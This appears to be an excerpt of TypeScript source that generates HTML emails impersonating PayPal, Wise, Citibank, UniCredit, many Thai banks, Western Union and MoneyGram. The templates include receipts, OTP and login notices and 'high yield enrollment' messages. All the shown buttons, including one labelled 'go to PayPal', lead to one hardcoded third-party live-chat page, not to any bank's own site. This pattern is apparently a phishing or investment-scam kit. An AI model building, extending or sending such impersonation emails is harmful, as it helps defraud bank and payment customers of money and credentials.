...
export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'card' | 'investment' | 'welcome' | 'otp' | 'high_yield_enrollment' | 'paypal' | 'wise' | 'citibank' | 'peoplechoice' | 'snb' | 'unicredit' | 'nonghyup' | 'live_chat_reply' | 'bangkokbank' | 'kasikornbank' | 'scb' | 'ktb' | 'bankayudhya' | 'tmbthanachart' | 'cimbthai' | 'uobthai' | 'standardcharteredthai' | 'icbcthai' | 'westernunion' | 'moneygram', data: any, lang?: string) => {
  ...
  `;
   ...
   switch (type) {
      ...
      case 'unicredit':
         subject = `${t('tx_receipt', lang)} — UniCredit`;
         content = getUnicreditEmailTemplate(data, lang);
         break;
         ...
         const paypalChatContent = parentType === 'paypal' ? `
          <div class="box">
             ...
             <div class="text-center" style="margin-top: 24px;">
                <a href="${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}" class="btn" style="background-color: ${btnColor};">${t('view_message_confirm', lang)}</a>
             </div>
             <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #6c7378;">
               ${t('need_help', lang)} <a href="https://code.jivosite.com/chatpage/YG4WdNtpis" style="color:#0070ba;">${t('continue_live_chat', lang)}</a>
             </p>
          </div>
         ` : `
          <div class="content">
             ...
             <div class="text-center" style="margin-top: 20px;">
                <a href="${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}" class="btn" style="background-color: ${btnColor};">${t('view_reply_continue', lang)}</a>
             </div>
             <p class="text-center text-muted" style="font-size: 11px; margin-top: 20px; color: #94a3b8;">
               ${t('button_doesnt_work', lang)}<br>
               <a href="${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}" style="font-size: 11px;">${data.chat_url || 'https://code.jivosite.com/chatpage/YG4WdNtpis'}</a>
             </p>
          </div>
         `;
    ...
    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; margin: 0 auto; background-color: #f5f7fa;">
        ...
        <tr>
            <td align="center" style="padding: 30px 40px;">
                <a href="https://code.jivosite.com/chatpage/YG4WdNtpis" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">${t('go_to_paypal', lang)}</a>
            </td>
        </tr>
        <tr>
            <td style="padding: 0 40px;">
